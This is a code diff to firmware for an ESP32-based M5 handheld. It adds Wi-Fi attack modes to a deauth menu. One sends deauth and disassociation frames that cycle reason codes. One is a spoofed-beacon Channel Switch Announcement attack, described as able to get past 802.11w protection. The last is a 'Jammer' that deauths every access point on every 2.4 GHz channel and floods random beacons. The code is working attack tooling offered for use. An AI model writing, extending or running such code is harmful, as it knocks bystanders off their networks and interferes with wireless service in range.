@@ -83,13 +83,18 @@ static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (g_clientCount < 16) { memcpy(g_clients[g_clientCount], cli, 6); g_clientCount++; }
 }
 
-// Send deauth + disassoc for one (dst,src,bssid) triple on the STA interface.
+// Send deauth + disassoc for one (dst,src,bssid) triple on the STA interface,
+// cycling reason codes (some client drivers only honour specific ones).
 static void kick(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid) {
+    static const uint8_t reasons[] = {1, 2, 4, 7};
+    static uint8_t ri = 0;
     uint8_t f[26];
     memcpy(f, DEAUTH_TMPL, sizeof(f));
     memcpy(f + 4, dst, 6);
     memcpy(f + 10, src, 6);
     memcpy(f + 16, bssid, 6);
+    f[24] = reasons[ri]; f[25] = 0x00;
+    ri = (ri + 1) & 3;
     f[0] = 0xC0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // deauth
     f[0] = 0xA0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // disassoc
 }
@@ -176,6 +181,41 @@ static int build_beacon(uint8_t *buf, const uint8_t *bssid, const char *ssid,
     buf[i++] = 0x01; buf[i++] = 0x00;                    // AKM count
     buf[i++] = 0x00; buf[i++] = 0x0f; buf[i++] = 0xac; buf[i++] = 0x02;   // AKM: PSK
     buf[i++] = 0x00; buf[i++] = 0x00;                    // RSN capabilities
+
+    return i;
+}
+
+// Beacon impersonating the AP but carrying a Channel Switch Announcement, which
+// tells associated clients to follow the AP to a (bogus) channel and drop the
+// link. Being a beacon (not a management deauth) it can disrupt some clients
+// even with 802.11w/PMF. Returns the frame length.
+static int build_csa_beacon(uint8_t *buf, const uint8_t *bssid, const char *ssid,
+                            uint8_t ssidLen, uint8_t curCh, uint8_t newCh,
+                            bool open, uint16_t seq) {
+    if (ssidLen > 32) ssidLen = 32;
+    int i = 0;
+    buf[i++] = 0x80; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
+    for (int k = 0; k < 6; k++) buf[i++] = 0xFF;
+    memcpy(buf + i, bssid, 6); i += 6;
+    memcpy(buf + i, bssid, 6); i += 6;
+    buf[i++] = (seq << 4) & 0xFF; buf[i++] = (seq >> 4) & 0xFF;
+    for (int k = 0; k < 8; k++) buf[i++] = 0x00;
+    buf[i++] = 0x64; buf[i++] = 0x00;                    // beacon interval
+    buf[i++] = open ? 0x01 : 0x11; buf[i++] = 0x00;      // capability
+
+    buf[i++] = 0x00; buf[i++] = ssidLen;                 // SSID
+    memcpy(buf + i, ssid, ssidLen); i += ssidLen;
+
+    buf[i++] = 0x01; buf[i++] = 0x08;                    // supported rates
+    buf[i++] = 0x82; buf[i++] = 0x84; buf[i++] = 0x8b; buf[i++] = 0x96;
+    buf[i++] = 0x24; buf[i++] = 0x30; buf[i++] = 0x48; buf[i++] = 0x6c;
+
+    buf[i++] = 0x03; buf[i++] = 0x01; buf[i++] = curCh;  // DS param (current channel)
+
+    buf[i++] = 0x25; buf[i++] = 0x03;                    // Channel Switch Announcement
+    buf[i++] = 0x01;                                     // mode: stop TX until switch
+    buf[i++] = newCh;                                    // target (bogus) channel
+    buf[i++] = 0x01;                                     // count: switch next beacon
 
     return i;
 }
@@ -445,13 +485,121 @@ static void run_deauth_all() {
     }
 }
 
+// CSA (Channel Switch Announcement) attack on one AP: spoof its beacons telling
+// clients to move to a bogus channel, dropping them. May work past PMF.
+static void run_csa(const NetInfo &ap) {
+    WiFi.mode(WIFI_STA);
+    delay(80);
+    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
+    M5.Display.fillScreen(COL_BG);
+    ui_hint("M5 = stop    hold side = exit");
+
+    uint8_t newCh = (ap.ch <= 6) ? 13 : 1;     // strand clients on a far channel
+    uint8_t buf[160];
+    uint16_t seq = 0;
+    uint32_t sent = 0, lastDraw = 0;
+    board_update();
+    while (true) {
+        board_update();
+        if (nav_long || ok_click) break;
+        int len = build_csa_beacon(buf, ap.bssid, ap.ssid, (uint8_t)strlen(ap.ssid),
+                                   ap.ch, newCh, ap.open, seq++);
+        for (int k = 0; k < 3; k++) {
+            esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
+            sent++;
+        }
+        delay(2);
+        if (millis() - lastDraw > 200) {
+            lastDraw = millis();
+            char l2[24];
+            snprintf(l2, sizeof(l2), "->ch%d   tx %lu", newCh, (unsigned long)sent);
+            ui_live("CSA attack", ap.ssid, l2);
+        }
+    }
+    wifi_off();
+}
+
+// Jammer: hop every channel and, on each, broadcast-deauth every AP living
+// there plus spray random beacons — maximum 2.4 GHz disruption in range.
+static void run_jammer() {
+    do_scan();                                  // learn the APs (leaves WIFI_OFF)
+    WiFi.mode(WIFI_STA);
+    delay(80);
+    M5.Display.fillScreen(COL_BG);
+    ui_hint("M5 = stop    hold side = exit");
+
+    static const uint8_t chans[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
+    const int nCh = sizeof(chans) / sizeof(chans[0]);
+    const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    uint8_t buf[160], mac[6];
+    uint16_t seq = 0;
+    uint32_t sent = 0, lastDraw = 0;
+    int ci = 0;
+    bool stop = false;
+
+    board_update();
+    while (!stop) {
+        uint8_t ch = chans[ci];
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+
+        for (int i = 0; i < g_netCount; i++) {          // deauth APs on this channel
+            if (g_nets[i].ch != ch) continue;
+            kick(bcast, g_nets[i].bssid, g_nets[i].bssid);
+            sent += 2;
+        }
+        for (int r = 0; r < 10; r++) {                  // + random beacon noise
+            gen_mac(mac);
+            char s[16];
+            int sl = snprintf(s, sizeof(s), "jam_%04X", (unsigned)(esp_random() & 0xFFFF));
+            int len = build_beacon(buf, mac, s, (uint8_t)sl, ch, seq++);
+            esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
+            sent++;
+        }
+        delay(2);
+        board_update();
+        if (nav_long || ok_click) stop = true;
+        ci = (ci + 1) % nCh;
+
+        if (millis() - lastDraw > 200) {
+            lastDraw = millis();
+            char l1[24], l2[24];
+            snprintf(l1, sizeof(l1), "ch%d   %d APs", ch, g_netCount);
+            snprintf(l2, sizeof(l2), "tx %lu", (unsigned long)sent);
+            ui_live("Jammer", l1, l2);
+        }
+    }
+    wifi_off();
+}
+
+// Scan, list APs, and run `action` on the one picked. Loops so stopping the
+// attack returns to the AP list (one level), not out of Deauth entirely.
+static void pick_target_and(void (*action)(const NetInfo &)) {
+    do_scan();
+    if (g_netCount == 0) {
+        ui_message("Deauth", "No networks", "hold=back");
+        ui_wait_any();
+        return;
+    }
+    while (true) {
+        for (int i = 0; i < g_netCount; i++) {
+            g_linePtr[i] = g_nets[i].ssid;
+            g_bars[i]    = rssi_bars(g_nets[i].rssi);
+        }
+        int c = ui_menu("Pick AP", g_linePtr, g_netCount, 0, g_bars);
+        if (c < 0) return;
+        action(g_nets[c]);
+    }
+}
+
 static void screen_deauth() {
     while (true) {                       // own loop: stop returns here, not two levels up
-        const char *items[] = {"Deauth All (rescan)", "Pick Target"};
-        int c = ui_menu("Deauth", items, 2);
+        const char *items[] = {"Target (sniff)", "Deauth all APs", "CSA attack", "Jammer"};
+        int c = ui_menu("Deauth", items, 4);
         if (c < 0) return;
-        if (c == 0) run_deauth_all();
-        else        screen_scan();       // pick an AP, front = deauth it
+        if (c == 0) pick_target_and(run_deauth_ap);   // sniff clients -> unicast kick
+        else if (c == 1) run_deauth_all();            // broadcast every AP, hop channels
+        else if (c == 2) pick_target_and(run_csa);    // channel-switch spoof
+        else if (c == 3) run_jammer();                // flood all channels
     }
 }
 
